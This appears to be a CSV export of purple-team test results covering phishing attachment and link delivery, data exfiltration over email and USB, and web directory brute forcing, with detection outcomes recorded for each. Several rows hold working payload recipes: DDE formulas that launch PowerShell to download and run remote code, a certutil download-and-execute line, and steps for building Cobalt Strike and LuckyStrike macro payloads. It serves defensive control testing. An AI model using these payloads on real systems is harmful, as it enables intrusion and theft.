Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-05T08:43:02.930Z,1483605782930,2017-01-05T10:30:19.930Z,1483612219930,2017-01-05T11:47:11.930Z,1483616831930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-07T22:43:47.930Z,1483829027930,2017-01-07T22:47:35.930Z,1483829255930,2017-01-07T22:50:45.930Z,1483829445930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,6 - Macro - WScript EXE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-07T11:49:42.930Z,1483789782930,2017-01-07T12:20:16.930Z,1483791616930,2017-01-07T12:52:38.930Z,1483793558930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-07T03:32:00.930Z,1483759920930,2017-01-07T05:15:00.930Z,1483766100930,2017-01-07T07:04:47.930Z,1483772687930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-06T03:54:59.930Z,1483674899930,2017-01-06T05:35:46.930Z,1483680946930,2017-01-06T07:14:19.930Z,1483686859930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-06T23:53:54.930Z,1483746834930,2017-01-07T00:54:54.930Z,1483750494930,2017-01-07T03:18:09.930Z,1483759089930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-06T17:05:57.930Z,1483722357930,2017-01-06T18:00:35.930Z,1483725635930,2017-01-06T19:42:26.930Z,1483731746930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-07T17:29:46.930Z,1483810186930,2017-01-07T18:03:30.930Z,1483812210930,2017-01-07T19:17:03.930Z,1483816623930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-07T19:21:34.930Z,1483816894930,2017-01-07T19:41:04.930Z,1483818064930,2017-01-07T19:59:18.930Z,1483819158930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-06T08:47:14.930Z,1483692434930,2017-01-06T09:48:03.930Z,1483696083930,2017-01-06T11:39:01.930Z,1483702741930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-07T08:05:32.930Z,1483776332930,2017-01-07T09:22:48.930Z,1483780968930,2017-01-07T10:29:07.930Z,1483784947930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-06T13:16:48.930Z,1483708608930,2017-01-06T14:55:05.930Z,1483714505930,2017-01-06T16:22:17.930Z,1483719737930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-05T12:59:29.930Z,1483621169930,2017-01-05T14:57:37.930Z,1483628257930,2017-01-05T16:03:03.930Z,1483632183930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-01-20T05:29:49.930Z,1484890189930,2017-01-20T07:28:01.930Z,1484897281930,2017-01-20T08:51:43.930Z,1484902303930,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-01-20T10:41:40.930Z,1484908900930,2017-01-20T11:39:01.930Z,1484912341930,2017-01-20T11:47:26.930Z,1484912846930,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,Email Gateway,,2017-01-21T06:35:29.930Z,1484980529930,2017-01-21T07:28:00.930Z,1484983680930,2017-01-21T08:19:59.930Z,1484986799930,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2017-01-21T03:54:35.930Z,1484970875930,2017-01-21T04:48:44.930Z,1484974124930,2017-01-21T05:13:18.930Z,1484975598930,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2017-01-20T13:43:52.930Z,1484919832930,2017-01-20T14:18:49.930Z,1484921929930,2017-01-20T14:24:00.930Z,1484922240930,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2017-01-21T08:56:19.930Z,1484988979930,2017-01-21T10:55:46.930Z,1484996146930,2017-01-21T12:34:04.930Z,1485002044930,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-01-21T00:02:05.930Z,1484956925930,2017-01-21T01:44:52.930Z,1484963092930,2017-01-21T03:12:46.930Z,1484968366930,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,NotDetected,TBD,TBD,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",,2017-01-20T16:19:54.930Z,1484929194930,2017-01-20T17:43:29.930Z,1484934209930,2017-01-20T18:39:32.930Z,1484937572930,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-01-20T19:58:46.930Z,1484942326930,2017-01-20T21:43:03.930Z,1484948583930,2017-01-20T22:39:49.930Z,1484951989930,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,5 - Link - Macro - WScript PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-08T14:50:43.930Z,1483887043930,2017-01-08T16:19:52.930Z,1483892392930,2017-01-08T16:50:47.930Z,1483894247930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,1 - Link - Macro - Cobalt Strike Standard,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-08T04:24:23.930Z,1483849463930,2017-01-08T05:09:41.930Z,1483852181930,2017-01-08T05:59:52.930Z,1483855192930,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,2 - Link - Macro - CobaltStrike Standard (MMG),T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-08T07:35:06.930Z,1483860906930,2017-01-08T09:16:28.930Z,1483866988930,2017-01-08T10:41:33.930Z,1483872093930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,3 - Link - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-08T11:40:37.930Z,1483875637930,2017-01-08T11:45:03.930Z,1483875903930,2017-01-08T11:50:54.930Z,1483876254930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T06:24:26.930Z,1484029466930,2017-01-10T07:41:52.930Z,1484034112930,2017-01-10T09:04:58.930Z,1484039098930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,12 - Link - Macro - MMG WMI Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T16:38:24.930Z,1483979904930,2017-01-09T17:46:47.930Z,1483984007930,2017-01-09T19:19:59.930Z,1483989599930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,6 - Link - Macro - WScript EXE,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-08T17:15:44.930Z,1483895744930,2017-01-08T18:27:00.930Z,1483900020930,2017-01-08T19:13:58.930Z,1483902838930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,9 - Link - Macro - LuckyStrike PowerShell CellEmbed,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T04:07:48.930Z,1483934868930,2017-01-09T05:55:40.930Z,1483941340930,2017-01-09T07:27:23.930Z,1483946843930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T11:57:02.930Z,1483963022930,2017-01-09T12:12:17.930Z,1483963937930,2017-01-09T12:24:19.930Z,1483964659930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,15 - Link - Archive - Macro,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-09T13:31:02.930Z,1483968662930,2017-01-09T14:14:33.930Z,1483971273930,2017-01-09T15:16:08.930Z,1483974968930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T09:31:27.930Z,1484040687930,2017-01-10T09:50:23.930Z,1484041823930,2017-01-10T11:31:14.930Z,1484047874930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T23:00:27.930Z,1484002827930,2017-01-10T00:23:11.930Z,1484007791930,2017-01-10T01:24:08.930Z,1484011448930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,20 - Link - Password-protected Office Doc - Standard CS payload,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T16:08:49.930Z,1484064529930,2017-01-10T17:08:48.930Z,1484068128930,2017-01-10T17:23:57.930Z,1484069037930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T18:21:02.930Z,1484072462930,2017-01-10T18:52:42.930Z,1484074362930,2017-01-10T19:59:39.930Z,1484078379930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,19 - Link - Encrypted Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T12:17:08.930Z,1484050628930,2017-01-10T12:38:51.930Z,1484051931930,2017-01-10T14:24:16.930Z,1484058256930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,10 - Link - Macro - MSBuild,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T07:54:08.930Z,1483948448930,2017-01-09T08:22:19.930Z,1483950139930,2017-01-09T10:08:03.930Z,1483956483930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,7 - Link - Macro - WScript PowerShell XOR,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-08T20:43:57.930Z,1483908237930,2017-01-08T22:19:10.930Z,1483913950930,2017-01-08T23:52:31.930Z,1483919551930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,16 - Link - Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T02:36:30.930Z,1484015790930,2017-01-10T03:59:50.930Z,1484020790930,2017-01-10T04:42:26.930Z,1484023346930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,4 - Link - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-08T12:12:15.930Z,1483877535930,2017-01-08T14:05:52.930Z,1483884352930,2017-01-08T14:17:58.930Z,1483885078930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,8 - Link - Macro - MMG WMI PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T00:56:16.930Z,1483923376930,2017-01-09T02:55:06.930Z,1483930506930,2017-01-09T03:17:18.930Z,1483931838930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,22 - Link - Link Inside Office Document,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-10T21:46:43.930Z,1484084803930,2017-01-10T23:46:17.930Z,1484091977930,2017-01-11T00:25:32.930Z,1484094332930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email with Malicious Links,Delivery,13 - Link - DDE - Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-09T19:22:46.930Z,1483989766930,2017-01-09T20:07:09.930Z,1483992429930,2017-01-09T21:25:45.930Z,1483997145930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM",,2017-01-03T19:26:59.930Z,1483471619930,2017-01-03T20:15:08.930Z,1483474508930,2017-01-03T21:05:25.930Z,1483477525930,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-01-03T22:10:54.930Z,1483481454930,2017-01-03T22:11:09.930Z,1483481469930,2017-01-04T00:09:43.930Z,1483488583930,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
